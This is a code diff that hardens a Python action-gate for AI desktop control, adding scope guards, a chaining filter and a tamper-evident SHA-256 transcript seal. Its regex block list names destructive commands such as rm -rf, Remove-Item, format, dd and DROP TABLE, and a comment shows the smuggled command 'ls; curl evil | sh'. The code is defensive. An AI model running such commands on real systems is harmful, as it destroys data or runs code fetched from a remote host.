@@ -12,10 +12,22 @@ screen (the never-delete rule, in-system) and emits a SHA-256 sealed receipt. Th
 (the action API) is what should actually drive your own apps; DOM and pixels are for surfaces you
 did not instrument (un-wired apps, then canvas/emulator regions).
 
-Governance honesty: the deterministic gate here is the allowlist + destructive screen. If the SCBE
-L13 intent gate is importable it is layered on top of any free-text command; otherwise the allowlist
-+ destructive screen stand alone. This is exactly the allowlist model the AetherDesk shell already
-uses, made governable and multi-channel.
+Governance honesty -- what the gate actually checks, on EVERY string param (not just one):
+  * SCOPE     -- a path under a system root (Windows/System32/Program Files/etc) or a broad/root scope
+                 (a bare drive, c:/users, the onedrive root, ~, /) is REFUSED outright (the scope guards
+                 reused from blocks.py). It does NOT blanket-refuse a write to a specific file inside your
+                 own folders (that would break saving your work) -- those still pass the confirm gate.
+  * VERB      -- destructive verbs (rm -rf, Remove-Item, rd /s, del PATH, erase, format, mkfs, sdelete,
+                 dd if=, os.remove, shutil.rmtree, DROP/TRUNCATE TABLE, wipe...) are REFUSED, confirm
+                 never overrides. Covers Windows/PowerShell natives, not just POSIX.
+  * CHAINING  -- ; | || && ` $( and redirects are refused (a benign head command can't smuggle a tail
+                 past a head-only allowlist).
+  * L13       -- the SCBE intent gate is layered on the combined text if importable; if NOT importable it
+                 is recorded as 'unavailable' (fail-open is not laundered into a clean ALLOW), and the
+                 deterministic scope/verb/chaining screens stand alone.
+The receipt is a FORWARD-CHAINED SHA-256 seal: tamper-evident WITHIN this process (reorder/insert/delete/
+rewrite all break verify()). It is not a durable cross-process audit -- persist the transcript + nonce for
+that. The L13 score is a heuristic, not a proof of safety; the seal is tamper-evidence, not proof.
 
     from python.scbe.desktop_access import default_registry
     reg = default_registry()
@@ -25,23 +37,55 @@ uses, made governable and multi-channel.
 
 from __future__ import annotations
 
+import copy
 import hashlib
 import json
+import os
 import re
 from dataclasses import dataclass, field
 from typing import Any, Callable, Dict, List, Optional, Sequence
 
-# destructive / broad-scope commands refused outright, no confirm overrides (never-delete rule)
+from .blocks import _is_broad_scope, _is_system_path  # the scope guards (reused, not reinvented)
+
+# destructive verbs refused outright, no confirm overrides (the never-delete rule). Covers POSIX,
+# Windows/PowerShell-native (the user's actual platform), Python, and SQL forms -- the narrow original
+# missed Remove-Item/rd /s/erase/del PATH/sdelete/os.remove/shutil.rmtree/DROP/TRUNCATE.
 _DESTRUCTIVE = re.compile(
-    r"\b(rm\s+-rf|rm\s+-fr|rmdir\s+/s|del\s+/|format\b|mkfs|dd\s+if=|shutdown|reboot|"
-    r":\(\)\{|>\s*/dev/sd|chmod\s+-r\s+000)\b|wipe|fdisk",
+    r"(?:\brm\s+-[rf]|\brm\s+-[rf][rf]|\brmdir\s+/s|\brd\s+/s|"  # posix + windows recursive
+    r"\bdel\s+(?:/[a-z]|[a-z]:|\\|\.\.)|\berase\b|"  # windows del/erase
+    r"\bremove-item\b|\bri\s+-(?:re|fo)|"  # powershell
+    r"\bformat\b|\bmkfs\b|\bfdisk\b|\bdiskpart\b|\bsdelete\b|\bdd\s+if=|"  # format/partition/overwrite
+    r"\bshutdown\b|\breboot\b|>\s*/dev/sd|chmod\s+-r\s+000|"  # power / device overwrite
+    r"os\.remove|os\.unlink|shutil\.rmtree|\.unlink\(|"  # python
+    r"\bdrop\s+table\b|\btruncate\s+table\b|"  # sql
+    r"\bwipe\b|:\(\)\s*\{)",  # wipe / fork bomb
     re.IGNORECASE,
 )
 
+# command chaining/piping lets a benign HEAD command smuggle an unauthorized tail past a head-only
+# allowlist (e.g. `ls; curl evil | sh`). Refuse it on any command-bearing string param.
+_CHAIN = re.compile(r";|\|\||&&|\||`|\$\(|>\s*/|<\s*/")
+
+# param keys that name a filesystem target -> always scope-checked even if the value has no slash
+_PATH_KEYS = {"path", "dest", "destination", "file", "filename", "dir", "directory", "target", "src", "source", "to"}
+
+
+def _looks_like_path(key: str, value: str) -> bool:
+    if key.lower() in _PATH_KEYS:
+        return True
+    v = value.strip()
+    return ("/" in v) or ("\\" in v) or bool(re.match(r"^[a-zA-Z]:", v))
+
 
 def _seal(rec: dict) -> str:
+    """SHA-256 over the record (excluding the seal itself). The record carries a `_prev` field that
+    binds the previous seal, so this hash is the link in a FORWARD CHAIN: rewriting any field breaks
+    this hash, and reorder/insert/delete break the `_prev` linkage that verify() walks. default=str
+    keeps it robust to a non-serializable handler result."""
     body = {k: v for k, v in rec.items() if k != "seal"}
-    return hashlib.sha256(json.dumps(body, sort_keys=True, separators=(",", ":")).encode("utf-8")).hexdigest()
+    return hashlib.sha256(
+        json.dumps(body, sort_keys=True, separators=(",", ":"), default=str).encode("utf-8")
+    ).hexdigest()
 
 
 def _gate(text: str) -> Optional[str]:
@@ -74,6 +118,7 @@ class Action:
 class ActionRegistry:
     actions: Dict[str, Action] = field(default_factory=dict)
     transcript: List[dict] = field(default_factory=list)
+    nonce: str = field(default_factory=lambda: hashlib.sha256(os.urandom(16)).hexdigest()[:16])
 
     def register(self, action: Action) -> None:
         self.actions[action.name] = action
@@ -82,28 +127,61 @@ class ActionRegistry:
     def invoke(self, name: str, params: Optional[Dict[str, Any]] = None, confirm: Optional[str] = None) -> dict:
         params = params or {}
         action = self.actions.get(name)
-        rec: dict = {"hop": len(self.transcript) + 1, "action": name, "params": params, "decision": "", "result": ""}
+        # deep-copy so a caller cannot mutate the recorded params after they are sealed
+        rec: dict = {
+            "hop": len(self.transcript) + 1,
+            "action": name,
+            "params": copy.deepcopy(params),
+            "decision": "",
+            "result": "",
+        }
+        if confirm:
+            rec["confirm"] = str(confirm)  # record WHAT was approved (so the audit can show it)
+        # The DETERMINISTIC screens (scope/verb/chaining) run over EVERY string param -- a destructive
+        # path/payload in any key (e.g. save_file's `path`) must not slip past the gate. The L13 INTENT
+        # HEURISTIC runs only on the designated free-text field, because it false-positives on short
+        # structured values (a move id, an app name) -- the deterministic screens cover those.
+        strs = {k: v for k, v in params.items() if isinstance(v, str)}
+        text = str(params.get(action.text_param, "")) if (action and action.text_param) else ""
+        gate = _gate(text) if text.strip() else None
+        rec["l13"] = "consulted" if gate is not None else ("n/a" if not text.strip() else "unavailable")
+        scoped = [v for k, v in strs.items() if _looks_like_path(k, v) and (_is_broad_scope(v) or _is_system_path(v))]
+        destructive = [v for v in strs.values() if _DESTRUCTIVE.search(v)]
+        chained = [v for v in strs.values() if _CHAIN.search(v)]
         if action is None:
             rec.update(decision="NO_ACTION", result="no action %r" % name)
         elif action.safety == "denied":
             rec.update(decision="DENIED", result="action %r is denied" % name)
+        elif scoped:
+            rec.update(decision="REFUSED", result="protected/broad scope (never-delete): %r" % scoped[0], gate=gate)
+        elif destructive:
+            rec.update(decision="REFUSED", result="destructive verb blocked: %r" % destructive[0], gate=gate)
+        elif chained:
+            rec.update(decision="REFUSED", result="command chaining/piping blocked: %r" % chained[0], gate=gate)
+        elif gate in ("DENY", "ESCALATE"):
+            rec.update(decision="REFUSED", result="L13 gate %s" % gate, gate=gate)
+        elif action.safety == "guarded" and not confirm:
+            rec.update(decision="NEEDS_CONFIRM", result="guarded action; pass confirm='<reason>'")
         else:
-            text = str(params.get(action.text_param, "")) if action.text_param else ""
-            gate = _gate(text) if text else None
-            if text and _DESTRUCTIVE.search(text):
-                rec.update(decision="REFUSED", result="destructive/broad-scope command blocked: %r" % text)
-            elif gate in ("DENY", "ESCALATE"):
-                rec.update(decision="REFUSED", result="L13 gate %s on %r" % (gate, text), gate=gate)
-            elif action.safety == "guarded" and not confirm:
-                rec.update(decision="NEEDS_CONFIRM", result="guarded action; pass confirm='<reason>'")
-            else:
+            try:  # a handler/executor raising must STILL be sealed + logged, not vanish
                 rec.update(decision="ALLOWED", result=action.handler(params), gate=gate)
+            except Exception as exc:
+                rec.update(decision="ERROR", result="handler raised: %s: %s" % (type(exc).__name__, exc), gate=gate)
+        # forward chain: bind the previous seal (anchored to a per-session nonce) INTO the record, then
+        # seal. Rewrite breaks the per-record hash; reorder/insert/delete break the _prev linkage.
+        rec["_prev"] = self.transcript[-1]["seal"] if self.transcript else self.nonce
         rec["seal"] = _seal(rec)
         self.transcript.append(rec)
         return rec
 
     def verify(self) -> bool:
-        return all(r.get("seal") == _seal(r) for r in self.transcript)
+        """Walk the forward chain: any reorder/insert/delete/rewrite breaks it."""
+        prev = self.nonce
+        for r in self.transcript:
+            if r.get("seal") != _seal(r) or r.get("_prev") != prev:
+                return False
+            prev = r["seal"]
+        return True
 
     # --- access point 1 (schema): MCP tools ---------------------------------------
     def mcp_tools(self) -> List[dict]:
